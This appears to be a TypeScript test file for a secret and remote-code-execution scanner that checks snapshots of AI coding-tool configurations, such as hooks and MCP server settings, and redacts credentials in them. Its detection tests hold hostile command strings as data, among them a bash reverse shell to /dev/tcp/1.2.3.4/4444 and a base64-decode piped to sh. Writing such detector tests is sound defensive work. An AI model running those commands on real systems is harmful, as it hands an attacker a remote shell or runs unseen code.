import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  scanForSecrets,
  scanForRcePatterns,
  redactCredentialsDeep,
  scanSnapshotForSecrets,
} from "../secrets.js";
import type { Snapshot, FileEntry, SecretFinding } from "../types.js";

// Fake secrets assembled at runtime so no literal token sits in the source.
const A = "A".repeat(24);
const ANTHROPIC = "sk-ant-" + "api03-" + A;
const OPENAI = "sk-" + "proj-" + A;
const GOOGLE = "AIza" + "x".repeat(35);
const JWT = "eyJ" + "abcdefghij" + "." + "eyJ" + "klmnopqrst" + "." + "uvwxyz0123";

function entry(content: string): FileEntry {
  return { relativePath: "scripts/x.sh", contentHash: "", content };
}

function snapshotWith(overrides: Partial<Snapshot> = {}): Snapshot {
  return {
    teleportVersion: "0.1.0",
    machineId: "id",
    machineAlias: "m",
    plugins: [],
    marketplaces: [],
    agents: [],
    rules: [],
    skills: [],
    commands: [],
    settings: {},
    globalDocs: [],
    hooks: [],
    mcp: [],
    scripts: [],
    ...overrides,
  };
}

function names(findings: SecretFinding[]): string[] {
  return findings.map((f) => f.pattern);
}

describe("expanded SECRET_PATTERNS", () => {
  it("detects Anthropic, OpenAI, Google keys and JWTs", () => {
    assert.ok(names(scanForSecrets([entry(ANTHROPIC)])).includes("Anthropic API Key"));
    assert.ok(names(scanForSecrets([entry(OPENAI)])).includes("OpenAI API Key"));
    assert.ok(names(scanForSecrets([entry(GOOGLE)])).includes("Google API Key"));
    assert.ok(names(scanForSecrets([entry(JWT)])).includes("JWT"));
  });
});

describe("expanded RCE_PATTERNS", () => {
  it("detects interpreter-eval and reverse-shell patterns", () => {
    assert.ok(scanForRcePatterns('node -e "require(1)"').length > 0);
    assert.ok(scanForRcePatterns("echo x | base64 -d | sh").length > 0);
    assert.ok(scanForRcePatterns("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").length > 0);
    assert.ok(scanForRcePatterns("python3 -c 'import os'").length > 0);
  });
});

describe("redactCredentialsDeep", () => {
  it("drops credential-keyed values at any depth and keeps the rest", () => {
    const input = {
      theme: "dark",
      author: "seil",
      token: "top-level-secret",
      mcpServers: { foo: { env: { OPENAI_API_KEY: "nested-secret", PATH: "/bin" } } },
    };
    const out = redactCredentialsDeep(input) as Record<string, any>;
    assert.equal(out.theme, "dark");
    assert.equal(out.author, "seil", "benign key containing 'auth' is kept, not dropped");
    assert.equal(out.token, undefined, "top-level credential key dropped");
    assert.equal(out.mcpServers.foo.env.OPENAI_API_KEY, undefined, "nested credential key dropped");
    assert.equal(out.mcpServers.foo.env.PATH, "/bin", "non-credential nested value kept");
  });

  it("recurses through arrays", () => {
    const out = redactCredentialsDeep([{ token: "x", keep: 1 }]) as Array<Record<string, unknown>>;
    assert.equal(out[0].token, undefined);
    assert.equal(out[0].keep, 1);
  });
});

describe("scanSnapshotForSecrets", () => {
  it("finds a secret hidden in a non-credential settings value", () => {
    // Key is not a credential key, so redaction won't remove it — value scanning must catch it.
    const snap = snapshotWith({ settings: { mcpServers: { x: { args: [ANTHROPIC] } } } });
    const findings = scanSnapshotForSecrets(snap);
    assert.ok(findings.some((f) => f.severity === "critical"), "settings value secret must be detected");
  });

  it("finds a secret in a hook command", () => {
    const snap = snapshotWith({ hooks: [{ name: "h", event: "PreToolUse", command: `export KEY=${OPENAI}` }] });
    const findings = scanSnapshotForSecrets(snap);
    assert.ok(findings.some((f) => f.file.startsWith("hooks.json")), "hook command secret must be detected");
  });

  it("returns nothing for a clean snapshot", () => {
    assert.equal(scanSnapshotForSecrets(snapshotWith()).length, 0);
  });
});
